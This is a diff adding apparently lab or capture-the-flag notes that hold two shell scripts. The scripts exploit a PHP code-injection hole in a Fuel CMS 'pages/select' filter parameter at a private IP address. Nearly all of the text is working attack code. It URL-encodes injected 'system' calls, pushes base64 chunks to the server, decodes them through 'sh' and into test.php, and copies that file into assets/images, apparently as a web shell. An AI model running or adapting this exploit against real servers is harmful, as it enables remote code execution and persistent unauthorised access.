@@ -1,0 +1,57 @@
+```bash
+# create
+$ ./x.sh touch+b64
+$ ./x.sh ls+b64
+# fill
+# replace "+" in base64 with %2b
+# just URL encode everything
+$ ./x.sh echo+-n+url(base64(command_or_code))+%3e+b64
+$ ./x.sh cat+b64
+$ ./x.sh base64+-d+b64+%3e+dec
+# x
+$ ./x.sh base64+-d+b64+%7c+sh
+$ ./x.sh cat+assets/images/test.php
+```
+
+```sh
+#/bin/bash
+
+echo -n "" > fuel
+
+pos=0
+final="cat"
+for i in $(cat b64); do
+  cmd="echo+$i+%3e+b64.$pos"
+  final="$final+b64.$pos"
+  echo "Line: $cmd"
+  curl -s "http://10.10.217.69/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27$cmd+2>%261%27%29%2b%27" > /dev/null
+  pos=$((pos+1))
+done
+
+echo "Merging files"
+
+cmd="$final+%3e+b64"
+curl -s "http://10.10.217.69/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27$cmd+2>%261%27%29%2b%27" > /dev/null
+
+echo "Printing b64"
+
+cmd="cat+b64"
+curl -s "http://10.10.217.69/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27$cmd+2>%261%27%29%2b%27" > /tmp/fuel
+head /tmp/fuel
+
+echo "Converting b64"
+
+cmd="base64+-d+b64+%3e+test.php"
+curl -s "http://10.10.217.69/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27$cmd+2>%261%27%29%2b%27" > /tmp/fuel
+
+echo "Print"
+
+cmd="cat+test.php"
+curl -s "http://10.10.217.69/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27$cmd+2>%261%27%29%2b%27" > /tmp/fuel
+head /tmp/fuel
+
+echo "Move"
+
+cmd="cp+test.php+assets/images/test.php"
+curl -s "http://10.10.217.69/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27$cmd+2>%261%27%29%2b%27" > /dev/null
+```
